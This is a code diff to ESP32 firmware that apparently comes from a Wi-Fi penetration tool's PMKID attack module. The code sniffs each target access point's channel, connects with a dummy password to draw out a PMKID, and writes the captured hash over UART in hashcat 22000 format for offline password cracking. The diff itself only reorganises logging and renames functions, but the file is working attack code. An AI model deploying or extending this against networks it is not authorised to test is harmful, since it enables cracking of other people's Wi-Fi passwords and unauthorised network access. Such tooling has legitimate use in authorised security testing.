@@ -1,4 +1,13 @@
 #include "attack_pmkid.h"
+#include <string.h>
+#include <stdio.h>
+#include "esp_event.h"
+#include "wifi_controller.h"
+#include "frame_analyzer.h"
+#include "frame_analyzer_types.h"
+#include "tasks_mannager.h"
+#include "uart_controller.h"
+#include "data_converter.h"
 
 TaskHandle_t pmkid_handle = NULL;
 
@@ -26,9 +35,12 @@ static void pmkid_handler(void *args, esp_event_base_t event_base, int32_t event
         (uint8_t *)(ap_info + last_scanned_target)->ssid,
         strlen((char *)(ap_info + last_scanned_target)->ssid)
     );
-    UART_write(ch22000_pmkid, hc22000_size_get());
-    UART_write("\n", 1);
-    printf("GOT_PMKID\n");
+
+    uint16_t str_len = strlen(ch22000_pmkid) + strlen("PMKID data: ") + 1;
+    char str[str_len + 1];
+    sprintf(str, "PMKID data: %s\n", ch22000_pmkid);
+    UART_write(str, str_len);
+    free(ch22000_pmkid);
 
     vTaskResume(pmkid_handle);
 }
@@ -46,32 +58,31 @@ void pmkid_active_scan_task(void *arg) {
         }
         last_scanned_target = scanned_target;
         if (attack_state) {
-            wifictl_sniffer_set_channel((ap_info + scanned_target)->primary);
+            wifi_sniffer_start((ap_info + scanned_target)->primary);
             frame_analyzer_change_bssid_filter((ap_info + scanned_target)->bssid);
         } else {
             attack_pmkid_start(ap_info + scanned_target);
         }
         wifi_sta_connect_to_ap(ap_info + scanned_target, "dummypassword");
 
-        UART_write((ap_info + last_scanned_target)->ssid, strlen((char *)(ap_info + last_scanned_target)->ssid));
-        UART_write("\n", 1);
+        uint16_t str_len = strlen((char *)(ap_info + last_scanned_target)->ssid) + strlen("Current SSID: ") + 1;
+        char str[str_len + 1];
+        sprintf(str, "Current SSID: %s\n", (ap_info + last_scanned_target)->ssid);
+        UART_write(str, str_len);
 
-        vTaskDelay(pmkid_scan_time_sec*1000 / portTICK_PERIOD_MS);
+        vTaskDelay(pmkid_scan_time_sec * 1000 / portTICK_PERIOD_MS);
 
         wifi_sta_disconnect();
 
         scanned_target++;
     }
 
-    if (pmkid_handle != NULL) {
-        vTaskDelete(pmkid_handle);
-    }
-
+    vTaskDelete(NULL);
 }
 
 void attack_pmkid_start(wifi_ap_record_t * ap_record) {
-    wifictl_sniffer_filter_frame_types(true, false, false);
-    wifictl_sniffer_set_channel(ap_record->primary);
+    wifi_sniffer_filter_frame_types(true, false, false);
+    wifi_sniffer_start(ap_record->primary);
     frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
     ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler, NULL));
     attack_state = 1;
@@ -81,7 +92,7 @@ void attack_pmkid_stop() {
     if (attack_state == 0) return;
     attack_state = 0;
     wifi_sta_disconnect();
-    wifictl_sniffer_stop();
+    wifi_sniffer_stop();
     frame_analyzer_capture_stop();
     ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_handler));
 }
